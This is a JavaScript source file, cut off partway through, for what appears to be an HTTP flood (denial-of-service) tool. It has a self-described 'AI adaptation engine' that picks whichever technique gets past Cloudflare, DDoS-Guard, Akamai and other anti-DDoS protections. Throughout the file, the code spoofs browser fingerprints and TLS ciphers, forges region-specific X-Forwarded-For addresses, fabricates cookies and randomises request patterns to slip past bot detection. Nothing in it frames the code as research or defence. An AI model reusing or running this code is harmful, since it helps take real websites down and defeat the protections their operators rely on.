const http2 = require('http2');
const http = require('http');
const net = require('net');
const fs = require('fs');
const colors = require('colors');
const setTitle = require('node-bash-title');
const cluster = require('cluster');
const tls = require('tls');
const HPACK = require('hpack');
const crypto = require('crypto');
const { exec } = require('child_process');
const httpx = require('axios');

// ===== ULTIMATE COLOR SCHEME =====
colors.setTheme({
    elite: ['cyan', 'bold'],
    apex: ['magenta', 'bold'],
    ai: ['green', 'bold'],
    flood: ['red', 'bold'],
    system: ['blue', 'bold'],
    stats: ['yellow', 'bold'],
    warning: ['red', 'bold'],
    success: ['green', 'bold']
});

// ===== ANIMATION SYSTEM =====
const animations = {
    spinner: ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'],
    dots: ['⣾', '⣽', '⣻', '⢿', '⡿', '⣟', '⣯', '⣷'],
    bars: ['▰▱▱▱', '▰▰▱▱', '▰▰▰▱', '▰▰▰▰', '▰▰▰▱', '▰▰▱▱', '▰▱▱▱']
};

let animationFrame = 0;
function getSpinner() {
    animationFrame = (animationFrame + 1) % animations.spinner.length;
    return animations.spinner[animationFrame];
}

// ===== AI ADAPTATION ENGINE =====
class AIAdaptationEngine {
    constructor() {
        this.learningRate = 0.1;
        this.successPatterns = new Map();
        this.failurePatterns = new Map();
        this.techniqueWeights = new Map();
        this.responseTimeHistory = [];
        this.adaptiveThreshold = 0.7;
        
        // Initialize with baseline weights
        this.techniqueWeights.set('cloudflare', 0.8);
        this.techniqueWeights.set('ddosguard', 0.7);
        this.techniqueWeights.set('iran', 0.9);
        this.techniqueWeights.set('generic', 0.6);
        this.techniqueWeights.set('mobile', 0.75);
        this.techniqueWeights.set('api', 0.85);
    }

    analyzeResponse(targetUrl, response, technique, responseTime) {
        const success = response.status < 400;
        const patternKey = `${technique}_${targetUrl.split('/')[2]}`;
        
        if (success) {
            this.successPatterns.set(patternKey, (this.successPatterns.get(patternKey) || 0) + 1);
            this.adjustWeights(technique, true);
        } else {
            this.failurePatterns.set(patternKey, (this.failurePatterns.get(patternKey) || 0) + 1);
            this.adjustWeights(technique, false);
        }
        
        this.responseTimeHistory.push(responseTime);
        if (this.responseTimeHistory.length > 100) {
            this.responseTimeHistory.shift();
        }
        
        return this.getOptimalTechnique(targetUrl);
    }

    adjustWeights(technique, success) {
        const currentWeight = this.techniqueWeights.get(technique) || 0.5;
        const adjustment = success ? this.learningRate : -this.learningRate;
        const newWeight = Math.max(0.1, Math.min(1.0, currentWeight + adjustment));
        this.techniqueWeights.set(technique, newWeight);
    }

    getOptimalTechnique(targetUrl) {
        let bestTechnique = 'generic';
        let bestScore = 0;
        
        for (const [technique, weight] of this.techniqueWeights) {
            const patternKey = `${technique}_${targetUrl.split('/')[2]}`;
            const successCount = this.successPatterns.get(patternKey) || 0;
            const failureCount = this.failurePatterns.get(patternKey) || 0;
            const totalAttempts = successCount + failureCount;
            
            let successRate = totalAttempts > 0 ? successCount / totalAttempts : 0.5;
            let score = weight * successRate;
            
            if (score > bestScore) {
                bestScore = score;
                bestTechnique = technique;
            }
        }
        
        return bestTechnique;
    }

    getAverageResponseTime() {
        if (this.responseTimeHistory.length === 0) return 1000;
        return this.responseTimeHistory.reduce((a, b) => a + b, 0) / this.responseTimeHistory.length;
    }
}

const aiEngine = new AIAdaptationEngine();

const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError', 'DeprecationWarning'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID', 'ERR_SOCKET_BAD_PORT', 'DEP0123'];

// ===== ULTIMATE TLS CONFIGURATION - EXTENDED =====
const eliteCiphers = [
    // TLS 1.3 Ciphers
    'TLS_AES_128_GCM_SHA256',
    'TLS_AES_256_GCM_SHA384', 
    'TLS_CHACHA20_POLY1305_SHA256',
    'TLS_AES_128_CCM_SHA256',
    'TLS_AES_128_CCM_8_SHA256',
    
    // Modern ECDHE Ciphers
    'ECDHE-ECDSA-AES128-GCM-SHA256',
    'ECDHE-RSA-AES128-GCM-SHA256',
    'ECDHE-ECDSA-AES256-GCM-SHA384',
    'ECDHE-RSA-AES256-GCM-SHA384',
    'ECDHE-ECDSA-CHACHA20-POLY1305',
    'ECDHE-RSA-CHACHA20-POLY1305',
    'ECDHE-ECDSA-AES128-SHA256',
    'ECDHE-RSA-AES128-SHA256',
    'ECDHE-ECDSA-AES256-SHA384',
    'ECDHE-RSA-AES256-SHA384',
    
    // Legacy but supported
    'ECDHE-RSA-AES128-SHA',
    'ECDHE-RSA-AES256-SHA',
    'AES128-GCM-SHA256',
    'AES256-GCM-SHA384',
    'AES128-SHA256',
    'AES256-SHA256',
    'AES128-SHA',
    'AES256-SHA',
    
    // Fallback ciphers
    'DES-CBC3-SHA',
    'CAMELLIA256-SHA',
    'CAMELLIA128-SHA'
].join(':');

const eliteSigAlgs = [
    'ecdsa_secp256r1_sha256',
    'rsa_pss_rsae_sha256',
    'rsa_pkcs1_sha256',
    'ecdsa_secp384r1_sha384',
    'rsa_pss_rsae_sha384',
    'rsa_pkcs1_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha512',
    'ed25519',
    'ecdsa_secp521r1_sha512',
    'rsa_pss_pss_sha256',
    'rsa_pss_pss_sha384',
    'rsa_pss_pss_sha512'
].join(':');

// ===== PERFECT FINGERPRINT MATCHING SYSTEM =====
class FingerprintMatcher {
    constructor() {
        this.browserProfiles = {
            chrome_windows: {
                userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                acceptEncoding: 'gzip, deflate, br',
                acceptLanguage: 'en-US,en;q=0.9',
                secHeaders: {
                    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'none',
                    'sec-fetch-user': '?1'
                },
                cookies: ['_ga', '_gid', '_gat', '__Secure-3PSID', '__Secure-3PAPISID'],
                tlsFeatures: ['TLS_AES_128_GCM_SHA256', 'TLS_AES_256_GCM_SHA384']
            },
            firefox_windows: {
                userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
                accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                acceptEncoding: 'gzip, deflate, br',
                acceptLanguage: 'en-US,en;q=0.5',
                secHeaders: {
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'none',
                    'sec-fetch-user': '?1'
                },
                cookies: ['_ga', '_gid', '_gat'],
                tlsFeatures: ['TLS_AES_128_GCM_SHA256', 'TLS_CHACHA20_POLY1305_SHA256']
            },
            safari_macos: {
                userAgent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
                accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                acceptEncoding: 'gzip, deflate, br',
                acceptLanguage: 'en-US,en;q=0.9',
                secHeaders: {
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'none'
                },
                cookies: ['_ga', '_gid'],
                tlsFeatures: ['TLS_AES_128_GCM_SHA256', 'TLS_AES_256_GCM_SHA384']
            },
            mobile_android: {
                userAgent: 'Mozilla/5.0 (Linux; Android 14; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
                accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                acceptEncoding: 'gzip, deflate, br',
                acceptLanguage: 'en-US,en;q=0.9',
                secHeaders: {
                    'sec-ch-ua-mobile': '?1',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'none'
                },
                cookies: ['_ga', '_gid'],
                tlsFeatures: ['TLS_AES_128_GCM_SHA256', 'TLS_CHACHA20_POLY1305_SHA256']
            }
        };
    }

    getMatchingFingerprint(protectionType, region) {
        let profile;
        
        switch(protectionType) {
            case 'cloudflare':
                profile = this.browserProfiles.chrome_windows;
                break;
            case 'ddosguard':
                profile = this.browserProfiles.firefox_windows;
                break;
            case 'iran':
                profile = this.browserProfiles.mobile_android;
                break;
            default:
                profile = Math.random() > 0.5 ? this.browserProfiles.chrome_windows : this.browserProfiles.firefox_windows;
        }
        
        // Regional adjustments
        if (region === 'iran') {
            profile.acceptLanguage = 'fa-IR,fa;q=0.9,en;q=0.8';
        } else if (region === 'europe') {
            profile.acceptLanguage = 'en-GB,en;q=0.9,de;q=0.8,fr;q=0.7';
        } else if (region === 'asia') {
            profile.acceptLanguage = 'zh-CN,zh;q=0.9,ja;q=0.8,ko;q=0.7';
        }
        
        return profile;
    }
}

const fingerprintMatcher = new FingerprintMatcher();

// ===== ADVANCED BEHAVIORAL PATTERNS =====
const behavioralPatterns = {
    humanLike: {
        requestTiming: {
            minDelay: 100,
            maxDelay: 2000,
            randomVariance: 0.3
        },
        mouseMovements: [
            'linear',
            'curved', 
            'random',
            'accelerated'
        ],
        scrollPatterns: [
            'smooth',
            'quick',
            'bounce',
            'random'
        ],
        clickPatterns: [
            'single',
            'double',
            'long-press',
            'right-click'
        ]
    },
    botDetectionEvasion: {
        eventTriggers: [
            'mousemove',
            'scroll',
            'click',
            'keydown',
            'touchstart'
        ],
        timingRandomization: true,
        patternVariation: true,
        fingerprintSpoofing: true
    }
};

// ===== APEX UNIVERSAL BYPASS INTELLIGENCE - ENHANCED =====
const apexBypass = {
    protectionPatterns: {
        cloudflare: ['cloudflare', '__cf', 'cf_', 'ray_id', 'challenge', 'cf-ray', 'cf-cache-status'],
        ddosguard: ['ddos-guard', 'ddosguard', '__ddg', '__ddg1', '__ddg2', 'ddg1', 'ddg2'],
        sucuri: ['sucuri', 'sucuri_cloudproxy', 'sucuri_cloudproxy_utm', 'x-sucuri-id'],
        incapsula: ['incapsula', 'visid_incap', 'incap_ses', 'incap_visid', 'incap_waf'],
        akamai: ['akamai', '_ak_', 'ak_bmsc', 'akavpwr', 'x-akamai'],
        aws: ['aws', 'x-amz', 'awselb', 'awsalb', 'x-aws-instance'],
        iran: ['asant', 'zoro', 'parsijoo', 'rayabaran', 'divar', '.ir', '?????', 'x-persian'],
        imperva: ['imperva', 'x-cdn', 'incap_', 'x-imperva'],
        captcha: ['recaptcha', 'hcaptcha', 'captcha', 'turnstile', 'cf-chl', 'g-recaptcha'],
        waf: ['waf', 'block', 'forbidden', 'access denied', 'security check', '403 forbidden', 'x-waf'],
        stackpath: ['stackpath', 'sp-edge', 'sp-', 'x-sp'],
        fastly: ['fastly', 'x-fastly', 'fastly-device', 'x-fastly-request-id'],
        azure: ['azure', 'x-azure-fdid', 'azurefrontdoor', 'x-azure-ref'],
        google: ['google', 'x-google', 'gws', 'google-cloud'],
        oracle: ['oracle', 'x-oracle', 'oci-origin'],
        barracuda: ['barracuda', 'x-barracuda'],
        fortinet: ['fortinet', 'x-fortinet'],
        paloalto: ['palo', 'alto', 'x-paloalto']
    },

    regionalHeaders: {
        iran: {
            'Accept-Language': 'fa-IR,fa;q=0.9,en;q=0.8',
            'X-Forwarded-For': () => `5.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
            'X-Real-IP': () => `5.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
            'X-Client-IP': () => `5.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
            'X-Originating-IP': () => `5.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`
        },
        europe: {
            'Accept-Language': 'en-GB,en;q=0.9,de;q=0.8,fr;q=0.7,es;q=0.6',
            'X-Forwarded-For': () => `88.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
            'X-Real-IP': () => `88.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
            'X-Client-IP': () => `88.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`
        },
        usa: {
            'Accept-Language': 'en-US,en;q=0.9,es;q=0.8,fr;q=0.7',
            'X-Forwarded-For': () => `72.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
            'X-Real-IP': () => `72.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
            'X-Client-IP': () => `72.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`
        },
        asia: {
            'Accept-Language': 'zh-CN,zh;q=0.9,ja;q=0.8,ko;q=0.7,en;q=0.6',
            'X-Forwarded-For': () => `110.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
            'X-Real-IP': () => `110.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
            'X-Client-IP': () => `110.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`
        }
    },

    techniques: {
        cloudflare: {
            headers: {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US,en;q=0.9',
                'Cache-Control': 'no-cache',
                'DNT': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-User': '?1',
                'Upgrade-Insecure-Requests': '1',
                'TE': 'Trailers'
            },
            cookies: ['__cf_bm', 'cf_clearance', '__cflb', '__cfruid', '__cf_bm'],
            tlsProfile: 'chrome_windows'
        },
        
        ddosguard: {
            headers: {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'en-US,en;q=0.5',
                'Cache-Control': 'no-cache',
                'DNT': '1',
                'X-Requested-With': 'XMLHttpRequest',
                'X-Forwarded-For': () => `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
                'Referer': 'https://www.google.com/'
            },
            cookies: ['__ddg1', '__ddg2', '__ddgid', '__ddgmark'],
            tlsProfile: 'firefox_windows'
        },

        iran: {
            headers: {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'fa-IR,fa;q=0.9,en;q=0.8',
                'Cache-Control': 'no-cache',
                'X-Requested-With': 'XMLHttpRequest',
                'X-Forwarded-For': () => `5.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
                'Referer': 'https://www.google.com/'
            },
            cookies: ['sessionid', 'csrftoken', 'user_id'],
            tlsProfile: 'mobile_android'
        },

        generic: {
            headers: {
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US,en;q=0.9',
                'Cache-Control': 'no-cache',
                'Connection': 'keep-alive',
                'DNT': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none'
            },
            cookies: ['_ga', '_gid', '_gat'],
            tlsProfile: 'chrome_windows'
        },

        mobile: {
            headers: {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'Accept-Encoding': 'gzip, deflate',
                'Cache-Control': 'no-cache',
                'X-Requested-With': 'XMLHttpRequest'
            },
            cookies: ['mobile_session', 'device_id'],
            tlsProfile: 'mobile_android'
        },

        api: {
            headers: {
                'Accept': 'application/json, text/plain, */*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US,en;q=0.9',
                'Cache-Control': 'no-cache',
                'Content-Type': 'application/json',
                'X-Requested-With': 'XMLHttpRequest'
            },
            cookies: ['api_key', 'access_token', 'refresh_token'],
            tlsProfile: 'chrome_windows'
        }
    }
};

// ===== ADVANCED PROTECTION DETECTOR =====
let detectedProtection = 'generic';
let regionalSettings = 'usa';
let activeTechnique = 'generic';
let techniqueStats = {};

function detectProtectionSystem(targetUrl, responseData = '') {
    const hostname = targetUrl.toLowerCase();
    const response = responseData.toLowerCase();
    
    // Regional detection
    if (hostname.includes('.ir') || hostname.includes('iran')) {
        regionalSettings = 'iran';
    } else if (hostname.includes('.eu') || hostname.includes('.de') || hostname.includes('.fr') || hostname.includes('.uk')) {
        regionalSettings = 'europe';
    } else if (hostname.includes('.jp') || hostname.includes('.cn') || hostname.includes('.kr') || hostname.includes('.in')) {
        regionalSettings = 'asia';
    }

    // Advanced protection system detection
    for (const [system, patterns] of Object.entries(apexBypass.protectionPatterns)) {
        for (const pattern of patterns) {
            if (hostname.includes(pattern) || response.includes(pattern)) {
                detectedProtection = system;
                activeTechnique = system;
                if (options.debug) console.log(colors.system(`?? Detected: ${system.toUpperCase()} | Region: ${regionalSettings.toUpperCase()}`));
                return;
            }
        }
    }
    
    // Smart fallback based on response patterns
    if (response.includes('captcha') || response.includes('recaptcha') || response.includes('cf-chl')) {
        detectedProtection = 'captcha';
        activeTechnique = 'cloudflare';
    } else if (response.includes('block') || response.includes('forbidden') || response.includes('403')) {
        detectedProtection = 'waf';
        activeTechnique = 'generic';
    } else if (response.includes('ddos') || response.includes('__ddg')) {
        detectedProtection = 'ddosguard';
        activeTechnique = 'ddosguard';
    }
}

// ===== AI-POWERED TECHNIQUE OPTIMIZER =====
function optimizeTechnique(targetUrl, technique, success, responseTime) {
    if (options.ai) {
        const optimalTechnique = aiEngine.analyzeResponse(targetUrl, { status: success ? 200 : 403 }, technique, responseTime);
        if (optimalTechnique !== activeTechnique) {
            activeTechnique = optimalTechnique;
            if (options.debug) console.log(colors.ai(`?? AI switched technique: ${technique} -> ${optimalTechnique}`));
        }
        return;
    }
    
    // Fallback to original optimization
    if (!techniqueStats[technique]) {
        techniqueStats[technique] = { attempts: 0, successes: 0 };
    }
    
    techniqueStats[technique].attempts++;
    if (success) techniqueStats[technique].successes++;
    
    const successRate = techniqueStats[technique].successes / techniqueStats[technique].attempts;
    if (techniqueStats[technique].attempts > 10 && successRate < 0.3) {
        const availableTechniques = Object.keys(apexBypass.techniques);
        const newTechnique = availableTechniques[Math.floor(Math.random() * availableTechniques.length)];
        activeTechnique = newTechnique;
        if (options.debug) console.log(colors.system(`?? Switching technique: ${technique} -> ${newTechnique} (Success rate: ${(successRate * 100).toFixed(1)}%)`));
    }
}

// ===== PERFECT COOKIE SYSTEM =====
const apexCookies = {
    names: {
        general: ['session', 'user', 'token', 'id', 'auth', 'pref', 'theme', 'lang', 'locale'],
        analytics: ['_ga', '_gid', '_fbp', '_fbc', '_gat', '_gac', '_uetms', '_clck'],
        security: ['csrftoken', 'XSRF-TOKEN', 'csrf', 'xsrf', 'security_token', '__Secure-', '__Host-'],
        framework: ['laravel_session', 'PHPSESSID', 'ASP.NET_SessionId', 'JSESSIONID', 'cfduid', 'symfony'],
        advertising: ['_gcl_au', '_uetsid', '_uetvid', '_fbp', 'FCNEC', 'ANONCHK'],
        custom: ['remember_me', 'visitor_id', 'tracking_id', 'user_preferences', 'ab_test'],
        cloudflare: ['__cf_bm', 'cf_clearance', '__cflb', '__cfruid'],
        ddosguard: ['__ddg1', '__ddg2', '__ddgid', '__ddgmark']
    },
    values: {
        session: ['abc123', 'xyz789', 'def456', 'session_' + Date.now()],
        analytics: ['GA1.2.' + Math.random().toString(36).substr(2, 9), 'FB1.2.' + Math.random().toString(36).substr(2, 9)],
        security: [crypto.randomBytes(16).toString('hex'), crypto.randomBytes(32).toString('base64')],
        custom: ['user_' + Math.random().toString(36).substr(2, 6), 'pref_' + Date.now()]
    },
    domains: ['.com', '.net', '.org', '.io', '.ir', '.uk', '.de', '.fr', '.jp', '.cn', '.ru', '.br'],
    paths: ['/', '/api', '/app', '/admin', '/dashboard', '/public', '/web', '/v1', '/v2', '/v3']
};

function generatePerfectCookies(targetUrl, protectionType) {
    const cookies = [];
    const urlObj = new URL(targetUrl);
    const profile = fingerprintMatcher.getMatchingFingerprint(protectionType, regionalSettings);
    
    // Generate cookies matching the browser profile
    profile.cookies.forEach(cookieName => {
        let value;
        
        if (cookieName.includes('_ga')) {
            value = `GA1.2.${Math.floor(Math.random() * 1e9)}.${Math.floor(Date.now() / 1000)}`;
        } else if (cookieName.includes('_gid')) {
            value = `GA1.2.${Math.floor(Math.random() * 1e9)}.${Date.now()}`;
        } else if (cookieName.startsWith('__Secure-') || cookieName.startsWith('__Host-')) {
            value = crypto.randomBytes(32).toString('base64');
        } else {
            value = crypto.randomBytes(16).toString('hex');
        }
        
        const secure = cookieName.startsWith('__Secure-') || cookieName.startsWith('__Host-') ? 'Secure; ' : '';
        const httpOnly = Math.random() > 0.3 ? 'HttpOnly; ' : '';
        const sameSite = Math.random() > 0.5 ? 'SameSite=Lax; ' : 'SameSite=None; ';
        const expires = new Date(Date.now() + (86400000 * 30)).toUTCString();
        
        cookies.push(`${cookieName}=${value}; Domain=${urlObj.hostname}; Path=/; Expires=${expires}; ${secure}${httpOnly}${sameSite}Priority=High`);
    });
    
    return cookies.join('; ');
}

// ===== ELITE USER AGENT GENERATOR - PERFECT MATCHING =====
const apexUserAgents = {
    chrome: {
        windows: [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ],
        macos: [
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ],
        linux: [
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ]
    },
    firefox: {
        windows: [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0'
        ],
        macos: [
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0'
        ],
        linux: [
            'Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0'
        ]
    },
    safari: {
        macos: [
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15'
        ]
    },
    mobile: {
        android: [
            'Mozilla/5.0 (Linux; Android 14; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
        ],
        ios: [
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPad; CPU OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1'
        ]
    }
};

function generatePerfectUserAgent(protectionType = 'generic', region = 'usa') {
    const profile = fingerprintMatcher.getMatchingFingerprint(protectionType, region);
    return profile.userAgent;
}

// ===== ADVANCED REQUEST RANDOMIZATION =====
function randomizeRequestPattern() {
    const patterns = {
        timing: {
            delay: Math.random() * 1000 + 100,
            jitter: Math.random() * 200 - 100
        },
        headers: {
            order: Math.random() > 0.5 ? 'standard' : 'random',
            case: Math.random() > 0.7 ? 'lower' : 'proper'
        },
        method: Math.random() > 0.8 ? 'POST' : 'GET'
    };
    
    return patterns;
}

// ===== APEX INTELLIGENT BYPASS - ENHANCED =====
function apexIntelligentBypass(targetUrl, currentHeaders, protectionType = 'generic') {
    const bypassedHeaders = {...currentHeaders};
    const technique = apexBypass.techniques[activeTechnique] || apexBypass.techniques.generic;
    const profile = fingerprintMatcher.getMatchingFingerprint(protectionType, regionalSettings);
    
    // Apply protection-specific headers
    Object.assign(bypassedHeaders, technique.headers);
    
    // Apply perfect fingerprint matching
    Object.assign(bypassedHeaders, profile.secHeaders);
    
    // Apply regional headers
    const regional = apexBypass.regionalHeaders[regionalSettings];
    if (regional) {
        Object.assign(bypassedHeaders, regional);
        // Execute IP generator functions
        for (const [key, value] of Object.entries(regional)) {
            if (typeof value === 'function') {
                bypassedHeaders[key] = value();
            }
        }
    }
    
    // Advanced AI-powered evasion headers
    const requestPattern = randomizeRequestPattern();
    
    Object.assign(bypassedHeaders, {
        'X-Request-ID': crypto.randomBytes(16).toString('hex'),
        'X-CSRF-Token': crypto.randomBytes(32).toString('hex'),
        'X-Requested-With': 'XMLHttpRequest',
        'X-Forwarded-Proto': 'https',
        'X-Forwarded-Port': '443',
        'X-Forwarded-Host': new URL(targetUrl).hostname,
        'X-Origin': 'https://www.google.com',
        'X-Client-Version': '1.0.0',
        'X-Device-ID': crypto.randomBytes(8).toString('hex'),
        'X-Request-Start': `t=${Date.now()}`,
        'X-Edge-Location': regionalSettings.toUpperCase(),
        'X-Client-Latency': Math.floor(requestPattern.timing.delay).toString(),
        'X-Response-Time': Math.floor(Math.random() * 500 + 50).toString()
    });

    // Behavioral randomization
    if (Math.random() > 0.7) {
        bypassedHeaders['X-Forwarded-For'] = bypassedHeaders['X-Forwarded-For']();
    }
    
    return bypassedHeaders;
}

// ===== REAL-TIME PROTOCOL SWITCHING =====
function shouldSwitchProtocol(response, currentProtocol) {
    if (!options.ai) return currentProtocol;
    
    const indicators = {
        http1: response.includes('HTTP/1.1') || response.includes('connection: close'),
        http2: response.includes('HTTP/2') || response.includes('grpc'),
        blocking: response.includes('blocked') || response.includes('captcha') || response.includes('cloudflare')
    };
    
    if (indicators.blocking && currentProtocol === 'http1') {
        return 'http2';
    } else if (indicators.blocking && currentProtocol === 'http2') {
        return 'http1';
    }
    
    return currentProtocol;
}

// ===== APEX REQUEST BUILDER - ENHANCED =====
function buildApexRequest(targetUrl) {
    const methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'];
    const method = methods[Math.floor(Math.random() * methods.length)];
    const userAgent = generatePerfectUserAgent(detectedProtection, regionalSettings);

    let baseHeaders = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
